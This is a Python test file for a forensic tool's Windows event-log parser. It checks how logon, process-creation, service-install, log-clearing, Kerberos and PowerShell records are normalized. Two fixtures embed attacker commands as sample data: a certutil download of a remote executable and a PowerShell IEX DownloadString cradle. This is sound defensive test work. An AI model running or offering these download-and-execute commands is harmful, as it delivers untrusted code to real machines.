"""Windows Security / System / PowerShell EVTX mapping (parsers/windows_events.py).

Records are hand-built XML in the exact shape python-evtx emits for real
Security-log records (field names from Microsoft's event documentation), for
the same reason as test_evtx.py: a real .evtx fixture would carry real
machine data. Each test pins what an investigator needs from that event:
the account, the remote address, and a readable message.
"""

import pytest

from netforensicai.core.entities import extract_entities
from netforensicai.core.event import EventSequence
from netforensicai.parsers.evtx import record_to_event
from netforensicai.parsers.windows_events import WINDOWS_EVENT_MAPPERS, _ip, map_windows_event

_EVENT_NS = "http://schemas.microsoft.com/win/2004/08/events/event"


def _record(event_id, data, provider="Microsoft-Windows-Security-Auditing", channel="Security", computer="DC01.corp.local"):
    data_xml = "".join(f'<Data Name="{name}">{value}</Data>' for name, value in data.items())
    return f"""<Event xmlns="{_EVENT_NS}"><System>
<Provider Name="{provider}" Guid="{{54849625-5478-4994-a5ba-3e3b0328c30d}}"></Provider>
<EventID>{event_id}</EventID>
<TimeCreated SystemTime="2026-09-20 03:14:15.926535+00:00"></TimeCreated>
<EventRecordID>4242</EventRecordID>
<Channel>{channel}</Channel>
<Computer>{computer}</Computer>
</System>
<EventData>{data_xml}</EventData>
</Event>"""


def _event(event_id, data, **kwargs):
    return record_to_event(_record(event_id, data, **kwargs), evidence_id="EV-0001", sequence=EventSequence())


# 4624 as Windows writes it for an RDP logon.
LOGON_4624 = {
    "SubjectUserSid": "S-1-5-18",
    "SubjectUserName": "DC01$",
    "SubjectDomainName": "CORP",
    "TargetUserSid": "S-1-5-21-1-2-3-1104",
    "TargetUserName": "alice",
    "TargetDomainName": "CORP",
    "LogonType": "10",
    "LogonProcessName": "User32",
    "WorkstationName": "ATTACKBOX",
    "ProcessName": r"C:\Windows\System32\svchost.exe",
    "IpAddress": "203.0.113.50",
    "IpPort": "51234",
    "ElevatedToken": "%%1842",
}


def test_logon_success_maps_account_source_and_logon_type():
    event = _event(4624, LOGON_4624)

    assert event.event_type == "logon_success"
    assert event.user == r"CORP\alice"
    assert event.src_ip == "203.0.113.50"
    assert event.src_port == 51234
    assert event.hostname == "DC01.corp.local"  # the logging machine, never overwritten
    assert "RemoteInteractive (RDP)" in event.message
    assert "elevated token" in event.message
    assert "203.0.113.50:51234 (ATTACKBOX)" in event.message
    # Everything not lifted into a field is still there for rules.
    assert event.raw_event_reference["event_data"]["LogonType"] == "10"
    assert event.raw_event_reference["windows_event_id"] == "4624"


def test_logon_failure_prefers_substatus_reason():
    event = _event(
        4625,
        {
            "TargetUserName": "administrator",
            "TargetDomainName": "CORP",
            "Status": "0xC000006D",
            "SubStatus": "0xC000006A",
            "LogonType": "3",
            "IpAddress": "198.51.100.7",
            "IpPort": "0",
            "WorkstationName": "-",
        },
    )

    assert event.event_type == "logon_failure"
    assert event.user == r"CORP\administrator"
    assert event.src_ip == "198.51.100.7"
    assert event.src_port is None  # "0" means no port
    assert "wrong password" in event.message
    assert "type 3 (Network)" in event.message


def test_logon_failure_falls_back_to_status_when_substatus_is_zero():
    event = _event(4625, {"TargetUserName": "bob", "Status": "0xC0000234", "SubStatus": "0x0", "LogonType": "2"})
    assert "account locked out" in event.message


def test_placeholders_do_not_become_entities():
    # Local interactive logons write "-" for every network field.
    data = dict(LOGON_4624, IpAddress="-", IpPort="-", WorkstationName="-", TargetDomainName="-")
    event = _event(4624, data)

    assert event.user == "alice"
    assert event.src_ip is None
    assert event.src_port is None
    values = {entity[2] for entity in extract_entities(event)}
    assert "-" not in values


def test_ipv4_mapped_address_is_unwrapped_to_join_with_pcaps():
    assert _ip("::ffff:10.1.2.3") == "10.1.2.3"
    assert _ip("fe80::1") == "fe80::1"
    assert _ip("not-an-ip") is None
    assert _ip("-") is None


def test_process_creation_4688_maps_process_fields():
    event = _event(
        4688,
        {
            "SubjectUserName": "alice",
            "SubjectDomainName": "CORP",
            "NewProcessId": "0x1a4",
            "NewProcessName": r"C:\Windows\System32\certutil.exe",
            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe",
            "ParentProcessName": r"C:\Windows\System32\cmd.exe",
            "TargetUserName": "-",
            "TargetDomainName": "-",
        },
    )

    assert event.event_type == "process_start"  # same type as Sysmon 1, so process rules apply to both
    assert event.user == r"CORP\alice"
    assert event.process_name.endswith("certutil.exe")
    assert event.process_id == 0x1A4
    assert event.parent_process.endswith("cmd.exe")
    assert "-urlcache" in event.command_line
    assert event.message == r"Process created: certutil.exe by CORP\alice"


def test_process_creation_prefers_target_account_when_present():
    event = _event(
        4688,
        {
            "SubjectUserName": "alice",
            "SubjectDomainName": "CORP",
            "TargetUserName": "svc_backup",
            "TargetDomainName": "CORP",
            "NewProcessName": r"C:\Windows\System32\cmd.exe",
        },
    )
    assert event.user == r"CORP\svc_backup"


def test_service_install_from_system_log_7045():
    event = _event(
        7045,
        {
            "ServiceName": "PSEXESVC",
            "ImagePath": r"%SystemRoot%\PSEXESVC.exe",
            "ServiceType": "user mode service",
            "StartType": "demand start",
            "AccountName": "LocalSystem",
        },
        provider="Service Control Manager",
        channel="System",
    )

    assert event.event_type == "service_installed"
    assert event.file_path == r"%SystemRoot%\PSEXESVC.exe"
    assert "PSEXESVC" in event.message
    assert "LocalSystem" in event.message


def test_audit_log_cleared_1102_reads_user_data():
    # 1102 carries its fields under <UserData>, in its own namespace.
    xml = f"""<Event xmlns="{_EVENT_NS}"><System>
<Provider Name="Microsoft-Windows-Eventlog" Guid="{{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}}"></Provider>
<EventID>1102</EventID>
<TimeCreated SystemTime="2026-09-20 03:20:00.000000+00:00"></TimeCreated>
<EventRecordID>4300</EventRecordID>
<Channel>Security</Channel>
<Computer>DC01.corp.local</Computer>
</System>
<UserData><LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
<SubjectUserSid>S-1-5-21-1-2-3-500</SubjectUserSid>
<SubjectUserName>mallory</SubjectUserName>
<SubjectDomainName>CORP</SubjectDomainName>
<SubjectLogonId>0x3e7</SubjectLogonId>
</LogFileCleared></UserData>
</Event>"""
    event = record_to_event(xml, evidence_id="EV-0001", sequence=EventSequence())

    assert event.event_type == "audit_log_cleared"
    assert event.user == r"CORP\mallory"
    assert event.message == r"Security event log cleared by CORP\mallory"
    assert event.raw_event_reference["event_data"]["SubjectUserName"] == "mallory"


def test_kerberos_service_ticket_names_rc4():
    event = _event(
        4769,
        {
            "TargetUserName": "alice@CORP.LOCAL",
            "TargetDomainName": "CORP.LOCAL",
            "ServiceName": "MSSQLSvc",
            "TicketEncryptionType": "0x17",
            "IpAddress": "::ffff:10.0.0.23",
            "IpPort": "49812",
            "Status": "0x0",
        },
    )

    assert event.event_type == "kerberos_service_ticket"
    assert event.src_ip == "10.0.0.23"
    assert "[RC4-HMAC]" in event.message
    assert "MSSQLSvc" in event.message


def test_kerberos_preauth_failure_reason():
    event = _event(4771, {"TargetUserName": "bob", "Status": "0x18", "IpAddress": "::ffff:10.0.0.99", "IpPort": "0"})
    assert event.event_type == "kerberos_preauth_failure"
    assert "wrong password" in event.message
    assert event.src_ip == "10.0.0.99"


def test_group_member_added_uses_sid_when_member_name_is_placeholder():
    event = _event(
        4732,
        {
            "MemberName": "-",
            "MemberSid": "S-1-5-21-1-2-3-1337",
            "TargetUserName": "Administrators",
            "TargetDomainName": "Builtin",
            "SubjectUserName": "mallory",
            "SubjectDomainName": "CORP",
        },
    )

    assert event.event_type == "group_member_added"
    assert event.user == "S-1-5-21-1-2-3-1337"
    assert r"Builtin\Administrators" in event.message
    assert r"by CORP\mallory" in event.message


def test_account_lockout_names_caller_machine():
    event = _event(4740, {"TargetUserName": "carol", "TargetDomainName": "WS042", "SubjectUserName": "DC01$"})
    assert event.event_type == "account_locked_out"
    assert event.user == "carol"
    assert "(from WS042)" in event.message


def test_powershell_script_block_keeps_full_text():
    script = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/p.ps1')"
    event = _event(
        4104,
        {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": script, "ScriptBlockId": "abc", "Path": ""},
        provider="Microsoft-Windows-PowerShell",
        channel="Microsoft-Windows-PowerShell/Operational",
    )

    assert event.event_type == "powershell_script_block"
    assert event.command_line == script
    assert event.file_path is None
    assert event.message.startswith("PowerShell script block: IEX")


def test_unmapped_security_event_still_falls_back_to_generic():
    event = _event(5156, {"Application": "x"})
    assert event.event_type == "windows_event:Microsoft-Windows-Security-Auditing"
    assert event.message is None


def test_same_event_id_from_another_provider_is_not_mapped():
    # 4624 only means "logon" from the Security-Auditing provider.
    assert map_windows_event("Some-Other-Provider", "4624", LOGON_4624) is None


@pytest.mark.parametrize("key", sorted(WINDOWS_EVENT_MAPPERS))
def test_every_mapper_survives_an_empty_record(key):
    # Truncated or older-schema records must degrade, never raise.
    provider, event_id = key
    event_type, fields, message = map_windows_event(provider, event_id, {})
    assert event_type
    assert message
    assert None not in fields.values()


def test_logon_joins_pcap_ip_entity():
    # The point of normalizing: the attacker IP in a 4624 is the same entity
    # as that IP in a capture.
    from netforensicai.core.entities import generate_entity_id

    event = _event(4624, LOGON_4624)
    ids = {entity[0] for entity in extract_entities(event)}
    assert generate_entity_id("ip_address", "203.0.113.50") in ids
